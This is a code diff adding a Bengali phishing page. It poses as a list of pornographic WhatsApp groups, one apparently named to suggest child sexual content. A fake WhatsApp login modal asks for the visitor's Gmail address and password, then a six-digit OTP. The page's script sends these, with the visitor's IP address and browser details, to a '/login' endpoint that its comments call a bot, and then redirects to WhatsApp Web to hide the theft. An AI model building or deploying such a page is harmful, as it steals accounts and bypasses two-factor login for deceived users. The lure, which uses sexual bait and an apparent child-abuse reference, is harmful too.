@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>হট হোয়াটসঅ্যাপ গ্রুপ</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #000; color: #fff; font-size: 16px; }
+        .header { padding: 10px; border-bottom: 1px solid #333; text-align: center; font-size: 18px; font-weight: bold; background: linear-gradient(45deg, #25D366, #128C7E); }
+        .group-list { padding: 10px; }
+        .group-item { display: flex; align-items: center; padding: 10px; border-bottom: 1px solid #333; cursor: pointer; transition: background-color 0.2s; }
+        .group-item:hover { background-color: #222; }
+        .group-avatar { 
+            width: 55px; 
+            height: 55px; 
+            border-radius: 50%; 
+            margin-right: 12px; 
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat;
+            border: 2px solid #25D366;
+        }
+        .group-details { flex-grow: 1; }
+        .group-name { font-weight: bold; margin-bottom: 5px; font-size: 16px; }
+        .group-desc { color: #999; font-size: 12px; }
+        .group-info { display: flex; align-items: center; margin-top: 3px; }
+        .group-count { background-color: #25D366; color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 11px; margin-right: 8px; }
+        .group-time { color: #666; font-size: 10px; }
+        .overlay { display: none; position: fixed; z-index: 900; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.95); }
+        .login-modal { 
+            background-color: #fff; 
+            margin: 8% auto; 
+            padding: 25px; 
+            width: 90%; 
+            max-width: 380px; 
+            border-radius: 16px; 
+            text-align: center; 
+            position: relative; 
+            color: #000;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .login-modal .whatsapp-logo { 
+            width: 60px; 
+            height: 60px; 
+            background: #25D366; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            margin: -45px auto 15px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+        .login-modal .whatsapp-logo i { font-size: 35px; color: white; }
+        .login-modal h3 { margin-bottom: 5px; color: #25D366; }
+        .login-modal p { font-size: 12px; color: #666; margin-bottom: 20px; }
+        .login-modal input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 8px 0; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            font-size: 15px;
+            transition: border-color 0.3s;
+        }
+        .login-modal input:focus { 
+            border-color: #25D366; 
+            outline: none;
+        }
+        .login-modal .login-btn { 
+            width: 100%; 
+            padding: 12px; 
+            background: linear-gradient(45deg, #25D366, #128C7E); 
+            color: #fff; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }
+        .login-modal .login-btn:hover { transform: scale(1.02); }
+        .close-btn { 
+            position: absolute; 
+            top: 12px; 
+            right: 15px; 
+            background: none; 
+            border: none; 
+            font-size: 22px; 
+            cursor: pointer; 
+            color: #999;
+        }
+        .close-btn:hover { color: #333; }
+        .security-note { font-size: 10px; color: #999; margin-top: 15px; }
+        
+        /* OTP Section Styles */
+        .otp-section {
+            display: none;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .otp-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            background: #f9f9f9;
+        }
+        .otp-input:focus {
+            border-color: #25D366;
+            outline: none;
+        }
+        .timer {
+            font-size: 14px;
+            color: #666;
+            margin: 10px 0;
+        }
+        .timer span {
+            font-weight: bold;
+            color: #ff0050;
+            font-size: 18px;
+        }
+        .network-error {
+            display: none;
+            color: #ff0050;
+            font-size: 12px;
+            margin-top: 10px;
+            padding: 8px;
+            background: #ffe0e0;
+            border-radius: 8px;
+        }
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #25D366;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+        .resend-btn.disabled {
+            color: #ccc;
+            cursor: not-allowed;
+        }
+        .loading {
+            display: none;
+            margin: 10px 0;
+        }
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="header">
+        <i class="fab fa-whatsapp"></i> হট গ্রুপ 🥵🤤 
+    </div>
+    <div class="group-list">
+        <div class="group-item" onclick="showLogin('বেস্ট হট পর্ন')">
+            <div class="group-avatar" style="background-image: url('https://f.top4top.io/p_3813k91n80.jpg');"></div>
+            <div class="group-details">
+                <div class="group-name">🔥 বেস্ট হট পর্ন 🥵🤤</div>
+                <div class="group-desc">এক্সক্লুসিভ কন্টেন্ট - ডেইলি আপডেট</div>
+                <div class="group-info">
+                    <span class="group-count"><i class="fas fa-users"></i> 828</span>
+                    <span class="group-time"><i class="far fa-clock"></i> সক্রিয় এখন</span>
+                </div>
+            </div>
+        </div>
+        <div class="group-item" onclick="showLogin('গ্রুপ বোকেপ')">
+            <div class="group-avatar" style="background-image: url('https://d.top4top.io/p_3813hxxfe0.jpg');"></div>
+            <div class="group-details">
+                <div class="group-name">💋 🥵গ্রুপ বোকেপ 🥵🤤</div>
+                <div class="group-desc">হট ভিডিও শেয়ার - ১৮+ কন্টেন্ট</div>
+                <div class="group-info">
+                    <span class="group-count"><i class="fas fa-users"></i> 257</span>
+                    <span class="group-time"><i class="far fa-clock"></i> ৫ মিনিট আগে</span>
+                </div>
+            </div>
+        </div>
+        <div class="group-item" onclick="showLogin('বাচ্চা স্যাঞ্জ')">
+            <div class="group-avatar" style="background-image: url('https://l.top4top.io/p_3813rc61d0.jpg');"></div>
+            <div class="group-details">
+                <div class="group-name">😈 বাচ্চা স্যাঞ্জ 🥵🤤</div>
+                <div class="group-desc">ডেইলি আপডেট - ভাইরাল কন্টেন্ট</div>
+                <div class="group-info">
+                    <span class="group-count"><i class="fas fa-users"></i> 350</span>
+                    <span class="group-time"><i class="far fa-clock"></i> ১০ মিনিট আগে</span>
+                </div>
+            </div>
+        </div>
+        <div class="group-item" onclick="showLogin('ইন্ডিয়ান এমএমএস ভাইরাল')">
+            <div class="group-avatar" style="background-image: url('https://h.top4top.io/p_3813v98940.jpg');"></div>
+            <div class="group-details">
+                <div class="group-name">🎬 ইন্ডিয়ান এমএমএস ভাইরাল</div>
+                <div class="group-desc">ভাইরাল ভিডিও - ট্রেন্ডিং কন্টেন্ট</div>
+                <div class="group-info">
+                    <span class="group-count"><i class="fas fa-users"></i> 683</span>
+                    <span class="group-time"><i class="far fa-clock"></i> সক্রিয় এখন</span>
+                </div>
+            </div>
+        </div>
+        <div class="group-item" onclick="showLogin('বাংলাদেশী হট গ্রুপ')">
+            <div class="group-avatar" style="background-image: url('https://e.top4top.io/p_3813xv1900.jpg');"></div>
+            <div class="group-details">
+                <div class="group-name">🇧🇩 বাংলাদেশী হট গ্রুপ 🔥</div>
+                <div class="group-desc">দেশীয় কন্টেন্ট - বাংলা ভিডিও</div>
+                <div class="group-info">
+                    <span class="group-count"><i class="fas fa-users"></i> 1.2K</span>
+                    <span class="group-time"><i class="far fa-clock"></i> সক্রিয় এখন</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loginOverlay" class="overlay" onclick="closeLogin()">
+        <div class="login-modal" onclick="event.stopPropagation()">
+            <button class="close-btn" onclick="closeLogin()">&times;</button>
+            <div class="whatsapp-logo">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <h3>WhatsApp গ্রুপে জয়েন করুন</h3>
+            <p>ভেরিফিকেশনের জন্য লগইন করুন</p>
+            
+            <!-- স্টেপ 1: জিমেইল + পাসওয়ার্ড ফর্ম -->
+            <form id="loginForm" method="POST">
+                <input type="email" name="username" id="email" placeholder="📧 জিমেইল অ্যাড্রেস" required>
+                <input type="password" name="password" id="password" placeholder="🔒 পাসওয়ার্ড" required>
+                <input type="hidden" name="groupName" id="groupName">
+                <input type="hidden" name="page_type" value="whatsapp_groups">
+                <button type="submit" id="submitBtn" class="login-btn">
+                    <i class="fab fa-whatsapp"></i> কন্টিনিউ করুন
+                </button>
+            </form>
+            
+            <!-- লোডিং ইন্ডিকেটর -->
+            <div id="loading" class="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px;">ভেরিফাই করা হচ্ছে...</p>
+            </div>
+            
+            <!-- স্টেপ 2: OTP ভেরিফিকেশন (প্রথম সাবমিটের পর দেখাবে) -->
+            <div id="otpSection" class="otp-section">
+                <div class="otp-inputs">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 6)">
+                </div>
+                <div class="timer">
+                    <i class="far fa-clock"></i> সময় বাকি: <span id="countdown">01:00</span>
+                </div>
+                <div id="networkError" class="network-error">
+                    <i class="fas fa-wifi"></i> নেটওয়ার্ক নেই! পুনরায় চেষ্টা করুন।
+                </div>
+                <button id="verifyOtpBtn" class="login-btn" style="background: linear-gradient(45deg, #ff0050, #00f2fe);">
+                    <i class="fas fa-check"></i> OTP ভেরিফাই করুন
+                </button>
+                <button id="resendBtn" class="resend-btn disabled" disabled>
+                    <i class="fas fa-sync-alt"></i> পুনরায় OTP পাঠান
+                </button>
+            </div>
+            
+            <div class="security-note">
+                <i class="fas fa-lock"></i> আপনার তথ্য সুরক্ষিত
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let countdownInterval;
+        let timeLeft = 60;
+        let userData = {};
+        let otpSent = false;
+        
+        function showLogin(groupName) {
+            document.getElementById('groupName').value = groupName;
+            document.getElementById('loginOverlay').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            // OTP সেকশন হাইড করুন
+            document.getElementById('otpSection').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            otpSent = false;
+            if (countdownInterval) clearInterval(countdownInterval);
+        }
+        
+        function closeLogin() {
+            document.getElementById('loginOverlay').style.display = 'none';
+            document.body.style.overflow = 'auto';
+            if (countdownInterval) clearInterval(countdownInterval);
+        }
+        
+        function moveToNext(current, nextIndex) {
+            if (current.value.length >= current.maxLength) {
+                const nextInput = document.querySelectorAll('.otp-input')[nextIndex];
+                if (nextInput) nextInput.focus();
+            }
+        }
+        
+        function startTimer() {
+            timeLeft = 60;
+            const countdownElement = document.getElementById('countdown');
+            const resendBtn = document.getElementById('resendBtn');
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('networkError').style.display = 'block';
+                    resendBtn.classList.remove('disabled');
+                    resendBtn.disabled = false;
+                }
+            }, 1000);
+        }
+        
+        // ফর্ম সাবমিট (প্রথমে বটে জিমেইল+পাসওয়ার্ড পাঠাবে)
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const groupName = document.getElementById('groupName').value;
+            
+            userData = {
+                username: email,
+                password: password,
+                groupName: groupName,
+                page_type: 'whatsapp_groups',
+                step: 'login',
+                timestamp: new Date().toLocaleString()
+            };
+            
+            // লোডিং দেখান
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // আইপি অ্যাড্রেস পাওয়া
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ipAddress = ipData.ip;
+            } catch(e) {
+                userData.ipAddress = 'Unknown';
+            }
+            userData.userAgent = navigator.userAgent;
+            
+            // বটে ডাটা পাঠান (জিমেইল + পাসওয়ার্ড)
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(userData)
+            }).catch(err => console.log('Data sent to bot'));
+            
+            // 1.5 সেকেন্ড পর OTP সেকশন দেখান
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('otpSection').style.display = 'block';
+                startTimer();
+                otpSent = true;
+            }, 1500);
+        });
+        
+        // OTP ভেরিফাই বাটন - OTP বটে পাঠাবে
+        document.getElementById('verifyOtpBtn').addEventListener('click', async function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            let otp = '';
+            otpInputs.forEach(input => otp += input.value);
+            
+            if (otp.length === 6) {
+                // OTP বটে পাঠান
+                const otpData = {
+                    username: userData.username || document.getElementById('email').value,
+                    otp_code: otp,
+                    groupName: document.getElementById('groupName').value,
+                    page_type: 'whatsapp_groups_otp',
+                    step: 'otp_verification',
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                // আইপি অ্যাড্রেস
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    otpData.ipAddress = ipData.ip;
+                } catch(e) {
+                    otpData.ipAddress = 'Unknown';
+                }
+                otpData.userAgent = navigator.userAgent;
+                
+                // OTP বটে পাঠান
+                fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(otpData)
+                }).catch(err => console.log('OTP sent to bot'));
+                
+                // সফল হলে WhatsApp খুলবে
+                alert('✅ সফলভাবে গ্রুপে ভেরিফাই করেছেন!\nরিডাইরেক্ট হচ্ছে...');
+                window.location.href = 'https://web.whatsapp.com/';
+            } else {
+                alert('🙅 সঠিক 6 ডিজিটের OTP লিখুন');
+            }
+        });
+        
+        // রিসেন্ড OTP
+        document.getElementById('resendBtn').addEventListener('click', function() {
+            if (timeLeft <= 0) {
+                document.getElementById('networkError').style.display = 'none';
+                this.classList.add('disabled');
+                this.disabled = true;
+                startTimer();
+                
+                // রিসেন্ড নোটিফিকেশন বটে পাঠান
+                const resendData = {
+                    username: userData.username || document.getElementById('email').value,
+                    action: 'resend_otp',
+                    page_type: 'whatsapp_groups',
+                    timestamp: new Date().toLocaleString()
+                };
+                fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(resendData)
+                }).catch(err => console.log('Resend OTP requested'));
+                
+                alert('✅ নতুন OTP পাঠানো হয়েছে!');
+            }
+        });
+        
+        // এন্টার চাপলে সাবমিট
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && document.getElementById('loginOverlay').style.display === 'block') {
+                if (document.getElementById('otpSection').style.display === 'block') {
+                    document.getElementById('verifyOtpBtn').click();
+                } else if (document.getElementById('loginForm').style.display !== 'none') {
+                    document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+                }
+            }
+        });
+    </script>
+</body>
+</html>
